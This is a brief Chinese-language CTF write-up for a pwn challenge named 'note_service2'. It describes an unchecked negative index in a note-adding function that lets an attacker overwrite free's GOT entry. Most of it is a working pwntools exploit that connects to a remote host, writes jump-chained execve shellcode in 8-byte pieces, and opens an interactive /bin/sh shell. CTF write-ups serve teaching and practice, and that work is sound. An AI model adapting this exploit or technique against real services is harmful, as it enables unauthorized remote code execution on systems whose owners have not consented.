## note_service2
在add 函数里面,index是用户自己输入的，index和context内容并且没有做检测，index可以输入负数，而且是在bss段的，观察发现del函数有free，而bss段上面就是.got.plt段,就可以考虑覆盖做rop，一次写入8字节，构造ROPchain,getshell!

```python
from pwn import *
context.arch = 'amd64'

def z(a=''):
	gdb.attach(p,a)
	if a=='':
		raw_input()

p = remote('117.78.43.222',31311)


def addnote(index,size,context):
    p.sendline('1')
    p.sendline(str(index))
    p.sendline(str(size))
    p.sendline(context)

ROPJMP = '\xeb\x19'
shellcodeP1 = '''
push 0x3b
'''
shellcodeP2='''
pop rax
'''
shellcodeP3 = '''
xor rsi,rsi
nop
nop
'''
shellcodeP4 = '''
xor rdx,rdx
nop
nop
'''
shellcodeP5 = '''
syscall 
nop
nop
'''

def getshell():
    payload1 = asm(shellcodeP1).ljust(5,'\x90')
    payload2 = asm(shellcodeP2).ljust(5,'\x90')
    payload3=asm(shellcodeP3)
    payload4=asm(shellcodeP4)
    payload5=asm(shellcodeP5)

    addnote(-17,8,payload1+ROPJMP) #over free got 
    addnote(0,8,payload2+ROPJMP) 
    addnote(1,8,payload3+ROPJMP)
    addnote(2,8,payload4+ROPJMP)
    addnote(3,8,payload5)
    addnote(4,8,'/bin/sh\x00') # execve("/bin/sh")

    p.sendline('4')
    p.recvuntil('index:')
    p.sendline('4')
    p.interactive()

if __name__=="__main__":
    getshell()
```